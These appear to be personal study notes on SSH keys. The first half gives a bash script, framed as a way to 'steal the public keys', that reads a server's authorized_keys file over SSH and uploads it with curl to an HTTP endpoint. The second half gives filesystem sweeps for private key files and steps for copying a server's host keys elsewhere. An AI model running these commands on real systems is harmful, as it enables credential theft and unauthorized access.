To search the server for private and public keys, i used

```bash
find / -type f -name "*.pub" 2>/dev/null
```

The command `find / -type f -name "*.pub" 2>/dev/null` searches for all regular files (`-type f`) with a `.pub` extension (typically public keys) across the entire filesystem (`/`). The `2>/dev/null` part suppresses error messages (like "Permission denied") by redirecting them (`2>`) to `/dev/null`, a special device that discards data. This ensures the output only shows found files without cluttering the terminal with errors.


`ssh-copy-id -i ~/.ssh/my_ssh_key.pub ec2-user@your-ec2-ip`



# Steps:
We will use the .pem file we have to ssh into the server and steal th e public keys.

```bash
#!/bin/bash
PEM_FILE="$HOME/.ssh/main-key2.pem"
USER="ubuntu"
HOST="publicIP"
REMOTE_AUTH_KEYS="/home/ubuntu/.ssh/authorized_keys"
UPLOAD_URL="http://publicIP:5000/upload"

# step 1: SSH into the server and retrieve authorized_keys  and save as a dupl
ssh -i "$PEM_FILE" "$USER@$HOST" "cat $REMOTE_AUTH_KEYS" > authorized_keys_dup

# step 2: upload the duplicate file using curl
if [ -s "authorized_keys_dup" ]; then
    curl -X POST -F "file=@authorized_keys_dup" "$UPLOAD_URL"
    echo "Upload complete."
    # remove the duplicate file after upload
    rm -f authorized_keys_dup
else
    echo "Error: authorized_keys file not found or empty."
fi

```

```bash
nano upload_script.sh
<enter the above code here>
chmod +x upload_script.sh # allow exec permissions
```

To execute file:
```bash
bash -x ./upload_script.sh
```

this line runs the script and give a view of what commands runs.



# **Explanation of the Script**

This Bash script does the following:
1. **Connects to an EC2 server** via SSH using a `.pem` key.
2. **Retrieves the `authorized_keys` file** from the remote server.
3. **Saves a duplicate copy** of the `authorized_keys` file locally.
4. **Uploads this duplicate file** to an HTTP server via `curl`.
5. **Deletes the duplicate file** after successful upload.

---
## **Breakdown of the Code**


`#!/bin/bash`

- This **shebang (`#!`)** tells the system to use Bash to execute the script.
    


```PEM_FILE="$HOME/.ssh/main-key2.pem"
USER="ubuntu" 
HOST="publicIP"
REMOTE_AUTH_KEYS="/home/ubuntu/.ssh/authorized_keys" 
UPLOAD_URL="http://publicIP:5000/upload"
```
- **`PEM_FILE`** → Path to the private key used for SSH authentication.
- **`USER`** → The username for SSH login (typically `ubuntu` for EC2 instances).
- **`HOST`** → The **public IP** of the EC2 instance.
- **`REMOTE_AUTH_KEYS`** → The path of the `authorized_keys` file inside the EC2 instance.
- **`UPLOAD_URL`** → The URL where the `authorized_keys_dup` file will be uploaded.
    
---

## **Step 1: SSH into the Server and Retrieve `authorized_keys`**


```
ssh -i "$PEM_FILE" "$USER@$HOST" "cat $REMOTE_AUTH_KEYS" > authorized_keys_dup
```

- **`ssh -i "$PEM_FILE"`** → Uses the private key (`.pem`) to authenticate SSH access.
- **`$USER@$HOST`** → Logs into the remote server as `ubuntu` at `publicIP`.
- **`"cat $REMOTE_AUTH_KEYS"`** → Runs `cat /home/ubuntu/.ssh/authorized_keys` inside the server, which outputs the file content.
- **`> authorized_keys_dup`** → Saves this output into a local file called `authorized_keys_dup`.
- -i: Specifies the private key file for authentication

---

## **Step 2: Upload the File Using `curl`**

```
if [ -s "authorized_keys_dup" ]; then
```

- **`[ -s "authorized_keys_dup" ]`** → Checks if the file `authorized_keys_dup` exists **and** is **not empty**.


```curl -X POST -F "file=@authorized_keys_dup" "$UPLOAD_URL"
```

- **`curl -X POST`** → Sends an HTTP `POST` request.
- **`-F "file=@authorized_keys_dup"`** → Uploads `authorized_keys_dup` as a form file to the server.
- **`$UPLOAD_URL`** → The API endpoint receiving the file.
    
`echo "Upload complete."`
- Prints a success message.


`rm -f authorized_keys_dup`
- **`rm -f authorized_keys_dup`** → Deletes the duplicate file (`-f` forces deletion without asking).
    
`else     echo "Error: authorized_keys file not found or empty." fi`
- If the file **does not exist** or is **empty**, prints an error.
---
## **Summary of Important Tags and Flags**

|Command|Explanation|
|---|---|
|`#!/bin/bash`|Defines Bash as the script interpreter|
|`ssh -i "$PEM_FILE" "$USER@$HOST"`|SSH into the EC2 instance using a private key|
|`"cat $REMOTE_AUTH_KEYS"`|Reads the `authorized_keys` file on the remote server|
|`> authorized_keys_dup`|Saves output as a local file|
|`[ -s "authorized_keys_dup" ]`|Checks if the file is non-empty|
|`curl -X POST -F "file=@authorized_keys_dup"`|Uploads the file using HTTP POST|
|`rm -f authorized_keys_dup`|Deletes the local duplicate after upload|

---

### 🔹 **Final Outcome**
- The script **fetches the `authorized_keys` file** from the EC2 instance.
- It **uploads the file** to a given HTTP server.
- It **cleans up the local copy** after upload.

Let me know if you need any modificatio

---
# SSH Key Authentication & Passwordless Login

## 1️⃣ Understanding SSH Authentication

Secure Shell (SSH) is a network protocol that enables secure communication between two computers. By default, SSH requires a password for authentication, but we can set up **passwordless login** using SSH keys.

## 2️⃣ Why Use SSH Keys?

SSH keys provide a more secure and convenient authentication method compared to passwords. Instead of entering a password every time, SSH uses a pair of cryptographic keys:

- **Private Key (**`**id_rsa**`**)**: Stays on your local machine.
    
- **Public Key (**`**id_rsa.pub**`**)**: Stored on the target server in `~/.ssh/authorized_keys`.

## 3️⃣ Steps to Set Up Password less SSH Login

### Step 1: Generate an SSH Key Pair

If you haven’t already generated an SSH key, run the following command on your local machine:

```
ssh-keygen -t rsa -b 4096 -f ~/.ssh/my_ssh_key
```

- `-t rsa`: Specifies the RSA algorithm.
- `-b 4096`: Generates a 4096-bit key for stronger security.
- `-f ~/.ssh/my_ssh_key`: Saves the key with a custom filename.
- **Press Enter** when prompted for a passphrase to leave it empty (optional).
    

### Step 2: Copy the Public Key to the Target Server

To enable passwordless login, copy the public key to the target server:

```
ssh-copy-id -i ~/.ssh/my_ssh_key.pub user@target-server
```

- `-i ~/.ssh/my_ssh_key.pub`: Specifies the public key to copy.
- `user@target-server`: The username and IP/hostname of the target machine.
- **The first time, it will ask for the password** of the target server.
    

### Step 3: SSH into the Target Server Without a Password

Now, you can SSH into the server without a password:

```
ssh -i ~/.ssh/my_ssh_key user@target-server
```

- `-i ~/.ssh/my_ssh_key`: Specifies the private key for authentication.
    
## 4️⃣ Finding Public & Private Keys on a Server

To locate SSH keys on a server, you can use:

```
find / -type f -name "*.pub" 2>/dev/null
```

- Searches for all public key files (`*.pub`).
- `2>/dev/null` suppresses permission errors.
    
To find both **private and public** keys:

```
find / -type f \( -name "id_rsa" -o -name "id_dsa" -o -name "id_ecdsa" -o -name "id_ed25519" -o -name "id_rsa.pub" -o -name "id_dsa.pub" -o -name "id_ecdsa.pub" -o -name "id_ed25519.pub" \) 2>/dev/null
```

## 5️⃣ Copying SSH Keys to Another Server

To move SSH keys to another server:

```
sudo cp /etc/ssh/ssh_host_*_key /tmp/
sudo cp /etc/ssh/ssh_host_*_key.pub /tmp/
```

- Requires `sudo` as private keys are protected.
- Copy them securely to a temporary location before transferring.

To transfer them securely to another server:

```
scp /tmp/ssh_host_*_key user@destination-server:/path/to/store/
```

## 6️⃣ Bypassing SSH Password Requirement (First Login)

By default, SSH requires a password the first time you set up key authentication. To bypass this:

1. **Manually add your public key** to `~/.ssh/authorized_keys` on the target machine.
2. Use **cloud-init** or **provisioning scripts** for automated deployments.
3. If you have **root access**, you can pre-configure keys for new users.
    
After setup, SSH will authenticate using keys **without** asking for a password. 🚀








